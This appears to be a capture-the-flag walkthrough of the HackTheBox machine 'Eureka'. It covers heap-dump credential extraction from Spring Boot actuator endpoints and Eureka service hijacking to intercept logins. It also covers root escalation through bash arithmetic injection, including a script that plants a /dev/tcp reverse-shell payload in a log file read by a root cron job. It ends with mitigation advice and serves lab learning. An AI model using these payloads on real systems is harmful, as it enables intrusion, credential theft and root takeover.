---
title: "Eureka HTB - Complete Walkthrough: Exploiting Spring Cloud Eureka Service Registry"
seoTitle: "Exploit Spring Cloud Registry walkthrough"
seoDescription: "Explore Spring Cloud microservices vulnerabilities: Eureka HTB walkthrough, Spring Boot actuator flaws, heap dump analysis, command injection"
datePublished: Wed Sep 03 2025 15:49:05 GMT+0000 (Coordinated Universal Time)
cuid: cmf45k3qz000302jmfnez3qts
slug: eureka-htb-complete-walkthrough-exploiting-spring-cloud-eureka-service-registry
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1756914475382/17ef792e-3844-4600-9649-99693a6fc978.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1756914525533/ccb95950-e3ab-4856-afac-ffeb80eac263.png
tags: hacking, ctf, cybersecurity-1, ctf-writeup, htb-machines, htb-writeup

---

## Introduction

Eureka is a fascinating HackTheBox machine that demonstrates real-world vulnerabilities in Spring Cloud microservices architecture. This walkthrough covers exploiting Spring Boot actuator endpoints, analyzing heap dumps for credential extraction, abusing Netflix Eureka service discovery, and escalating privileges through command injection vulnerabilities.

**Machine Information:**

* **IP:** 10.10.11.66
    
* **OS:** Ubuntu 20.04.6 LTS
    
* **Difficulty:** HARD
    
* **Skills Required:** Spring Boot exploitation, Service discovery abuse, Command injection
    

## Initial Reconnaissance

### Port Scanning

Let's start with a comprehensive port scan to identify available services:

```bash
nmap -sC -sV -oA eureka 10.10.11.66
```

**Results:**

```php
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8761/tcp open  unknown
```

The scan reveals three open ports:

* **SSH (22)** - Standard SSH service
    
* **HTTP (80)** - Nginx web server with a redirect to `furni.htb`
    
* **8761** - Unknown service (this is actually the Eureka server)
    

### Domain Discovery

Port 80 redirects to `furni.htb`, so we need to add this to our hosts file:

```bash
echo "10.10.11.66 furni.htb eureka.htb" >> /etc/hosts
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756913597129/21a23e43-9366-4349-8158-a9fff8aad22e.png align="center")

### Technology Stack Identification

Accessing an invalid endpoint reveals this is a Spring Boot application:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756913610753/9b4d3a8f-ca1c-48e5-92fe-151171c6b887.png align="center")

## Vulnerability Discovery with Nuclei

Running Nuclei reveals critical Spring Boot actuator endpoints:

```bash
nuclei -u http://furni.htb
```

**Key findings:**

* **springboot-heapdump** \[CRITICAL\] - `/actuator/heapdump`
    
* Multiple Spring Boot actuator endpoints exposed
    
* Spring Boot application with extensive endpoint exposure
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756913631130/707c85cd-e59b-4b90-bb56-6b5c8fc7abf3.png align="center")

## Heap Dump Analysis - Initial Foothold

The most critical finding is the exposed heap dump endpoint. Let's download and analyze it:

```bash
file heapdump
# Output: Java HPROF dump, created Thu Aug  1 18:29:32 2024
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756913663276/a18e505c-f912-40d8-bb15-ee7c8dfc7776.png align="center")

### Credential Extraction

Analyzing the heap dump for credentials using string extraction:

```bash
strings heapdump | grep -Eai "(secret|passwd|password)\ ?[=|:]\ ?['|\"]?\w{1,}['|\"]?"
```

This regex is designed to find common secret assignments in files, scripts, or configs. Let’s break it down piece by piece:

1. `(secret|passwd|password)`
    
    * Matches any of the words `secret`, `passwd`, or `password`.
        
    * The parentheses create a group, and the `|` acts as OR.
        
    * Used to identify common keywords for credentials.
        
2. `\ ?`
    
    * Matches **0 or 1 space**.
        
    * Allows the regex to handle cases like `password=abc` and `password = abc`.
        
3. `[=|:]`
    
    * Matches a single character: `=`, `|`, or `:`.
        
    * Note: `|` inside brackets is literal; the intention is probably just to match `=` or `:`.
        
4. `\ ?` (again)
    
    * Optional space after the `=` or `:`.
        
5. `['|\"]?`
    
    * Matches an **optional single** `'` or double `"` quote around the value.
        
    * Handles formats like `'secretValue'`, `"secretValue"`, or `secretValue`.
        
6. `\w{1,}`
    
    * Matches **1 or more word characters** (`[a-zA-Z0-9_]`).
        
    * Captures the actual secret, password, or token.
        
7. `['|\"]?` (again)
    
    * Optional closing quote for the secret.
        
        ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756913862321/4daea283-72c3-4fbb-a513-bca5f74e4a61.png align="center")
        

**Discovered credentials:**

```php
{password=0sc@r190_S0l!dP@sswd, user=oscar190}
```

**First user:** `oscar190:0sc@r190_S0l!dP@sswd`

### SSH Access

```bash
ssh oscar190@furni.htb
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756913878754/759cd1d0-9618-49e7-b405-1c408ee2fff8.png align="center")

## Service Discovery - Understanding the Architecture

After gaining initial access, let's explore the internal network:

```bash
ss -tuln
```

This reveals several internal services:

* **8080** - Internal web service
    
* **8081** - Another internal service
    
* **8082** - Third internal service
    
* **8761** - Eureka Server (confirmed)
    

### Eureka Server Analysis

Further analysis of the heap dump reveals Eureka server credentials:

```bash
strings heapdump | grep 8761
```

**Output:**

```php
http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/
```

**Eureka credentials:** `EurekaSrvr:0scarPWDisTheB3st`

## Understanding Netflix Eureka

### What is Eureka?

Netflix Eureka is a **service registry** for microservices architecture that enables:

* **Service Registration** - Microservices register themselves
    
* **Service Discovery** - Services find each other dynamically
    
* **Load Balancing** - Distribute traffic across service instances
    
* **Health Monitoring** - Track service availability
    

### Security Implications

When Eureka is exposed without proper authentication:

1. **Service Hijacking** - Register malicious services with existing names
    
2. **Traffic Interception** - Route legitimate traffic to attacker-controlled servers
    
3. **SSRF Attacks** - Access internal services through service registration
    
4. **Information Disclosure** - Enumerate internal service architecture
    

## Eureka Service Hijacking Attack

### Port Forwarding

First, let's establish port forwarding to access the Eureka server:

```bash
ssh oscar190@furni.htb -L 8761:127.0.0.1:8761
```

### Accessing Eureka Dashboard

Navigate to [`http://localhost:8761`](http://localhost:8761) and authenticate with the discovered credentials:

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756913936709/f7b0cb56-151b-48da-bee4-fdb5f030c0e0.png align="center")

The dashboard reveals registered services including `USER-MANAGEMENT-SERVICE`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756914062406/061b85de-bcaa-4639-87fa-29532673f241.png align="center")

### Malicious Service Registration

We can hijack traffic by registering a malicious service with the same name as a legitimate one:

```bash
curl -X POST "http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE" \
  -H "Content-Type: application/json" \
  -d '{
    "instance": {
      "instanceId": "USER-MANAGEMENT-SERVICE:10.10.14.93:8081",
      "hostName": "10.10.14.93",
      "app": "USER-MANAGEMENT-SERVICE",
      "ipAddr": "10.10.14.93",
      "vipAddress": "USER-MANAGEMENT-SERVICE",
      "secureVipAddress": "USER-MANAGEMENT-SERVICE",
      "status": "UP",
      "port": {
        "$": 8081,
        "@enabled": "true"
      },
      "dataCenterInfo": {
        "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
        "name": "MyOwn"
      }
    }
  }'
```

* `curl -X POST`
    
    * Sends an HTTP POST request.
        
    * POST is used here because we are **creating a new service instance** on the Eureka server.
        
* URL with credentials
    
    ```php
    http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE
    ```
    
    * `EurekaSrvr` → username
        
    * `0scarPWDisTheB3st` → password
        
    * [`localhost:8761`](http://localhost:8761) → Eureka server address and port
        
    * `/eureka/apps/USER-MANAGEMENT-SERVICE` → endpoint to register the service called `USER-MANAGEMENT-SERVICE`.
        
* `-H "Content-Type: application/json"`
    
    * Sets the HTTP header `Content-Type` to `application/json`.
        
    * Tells the server that the request body is in **JSON format**.
        
* `-d 'JSON_PAYLOAD'`
    
    * The `-d` option sends the **data payload** in the POST request.
        
    * This JSON payload contains the **service instance information**:
        
    
    **Key fields explained:**
    
    * `"instanceId"`: Unique identifier for the service instance. Usually combines service name, IP, and port.
        
    * `"hostName"` & `"ipAddr"`: Host information where the service runs.
        
    * `"app"`: Service name.
        
    * `"vipAddress"` & `"secureVipAddress"`: Virtual IP addresses used for service discovery.
        
    * `"status"`: Indicates service health (`UP` = healthy).
        
    * `"port"`: Port number where the service listens (`"$": 8081`) and whether it’s enabled.
        
    * `"dataCenterInfo"`: Describes the environment or data center. `"MyOwn"` is custom (not AWS).
        

### Traffic Interception

Start a netcat listener to capture intercepted traffic:

```bash
nc -lvnp 8081
```

**Captured credentials:**

```php
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=MDg3NWY3NzItYTFlMS00Y2EwLWE2YTgtMDNkMGFjMjU1N2Fm

username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=...
```

**Decoded credentials:** `miranda.wise@furni.htb:IL!veT0Be&BeT0L0ve`

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756914097627/c6bba82f-16a6-4adf-87ce-6f663c400296.png align="center")

## Lateral Movement

### SSH as miranda-wise

```bash
ssh miranda-wise@furni.htb
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756914116090/b5af878d-2cbb-45b2-b3ad-917eb2d71f2f.png align="center")

## Privilege Escalation

### Process Analysis

Examining running processes reveals suspicious cron jobs:

```bash
ps aux | grep -i script
```

**Output:**

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756914162937/87dabc77-1f8a-486d-9e74-9f2bf6d69e20.png align="center")

```php
root      621095  621091  0 14:26 ?        00:00:00 /bin/sh -c /opt/scripts/log_cleanup.sh
root      621097  621095  0 14:26 ?        00:00:00 /bin/sh /opt/scripts/log_cleanup.sh
```

### Script Analysis

Exploring the `/opt` directory:

```bash
ls -la /opt/
```

**Key findings:**

* `log_`[`analyse.sh`](http://analyse.sh) - Executable script with potential vulnerabilities
    
* `scripts/` - Directory containing cleanup scripts
    

### Analyzing log\_[analyse.sh](http://analyse.sh)

```bash
cat /opt/log_analyse.sh
```

The script contains several critical vulnerabilities:

#### 1\. Command Injection Vulnerability

```bash
LOG_FILE="$1"
# Later used in: grep "LoginSuccessLogger" "$LOG_FILE"
```

#### 2\. Arithmetic Expression Injection

The critical vulnerability is in this line:

```bash
if [[ "$existing_code" -eq "$code" ]]; then
```

When `$code` contains command substitution like `$(command)`, bash executes it during arithmetic evaluation.

### Exploitation Strategy

The application writes logs to `/var/www/web/cloud-gateway/log/application.log`, and miranda-wise has write access to this directory.

#### Exploitation Script

```python
#!/usr/bin/env python3
import os

# Change to target directory
os.chdir("/var/www/web/cloud-gateway/log")

# Remove existing log file
try:
    os.remove("application.log")
except PermissionError:
    os.chmod("application.log", 0o666)
    os.remove("application.log")

# Create malicious log entry with command injection payload
payload = "HTTP Status: x[$(bash -c 'bash -i >& /dev/tcp/10.10.14.93/8811 0>&1')]\n"
with open("application.log", "w") as f:
    f.write(payload)

print("Payload injected. Waiting for root shell...")
```

### Getting Root Shell

1. **Start netcat listener:**
    

```bash
nc -lvnp 8811
```

2. **Execute the exploitation script:**
    

```bash
python3 exploit.py
```

3. **Wait for the cron job to execute the vulnerable script**
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1756914247678/bb3bd283-1cc1-4a6c-b7b6-b498e4376e35.png align="center")

**Root Flag:** `5cd34ef89ef41———————`

## Key Vulnerabilities Summary

### 1\. Spring Boot Actuator Exposure

* **Impact:** Information disclosure, credential leakage
    
* **Fix:** Disable actuator endpoints or restrict access
    

### 2\. Heap Dump Analysis

* **Impact:** Complete credential exposure
    
* **Fix:** Never expose heap dumps, use proper secret management
    

### 3\. Eureka Service Hijacking

* **Impact:** Traffic interception, credential theft
    
* **Fix:** Implement proper authentication and network segmentation
    

### 4\. Command Injection in Log Analysis

* **Impact:** Privilege escalation to root
    
* **Fix:** Proper input validation and sanitization
    

## Mitigation Strategies

### Application Layer

* Enable basic HTTP authentication for Eureka
    
* Implement service authentication/authorization
    
* Disable unnecessary Spring Boot actuator endpoints
    
* Use proper input validation in shell scripts
    

### Network Layer

* Use firewall rules and micro-segmentation
    
* Block internet exposure of internal services
    
* Implement mTLS between services
    
* Restrict outbound connections
    

### Operational Security

* Regular security audits of microservice configurations
    
* Implement proper logging without sensitive data
    
* Use secret management solutions
    
* Monitor service registration anomalies
    

## Conclusion

The Eureka machine demonstrates the complexity of securing microservices architectures. The attack chain showcased multiple real-world vulnerabilities:

1. **Information Disclosure** through exposed actuator endpoints
    
2. **Service Discovery Abuse** leading to traffic interception
    
3. **Command Injection** enabling privilege escalation
    

This machine serves as an excellent example of why proper security controls are essential in cloud-native applications, especially when using service discovery patterns.

### Key Takeaways

* Never expose management endpoints without authentication
    
* Implement proper network segmentation for internal services
    
* Validate all user inputs in scripts and applications
    
* Monitor service registrations for anomalies
    
* Use proper secret management solutions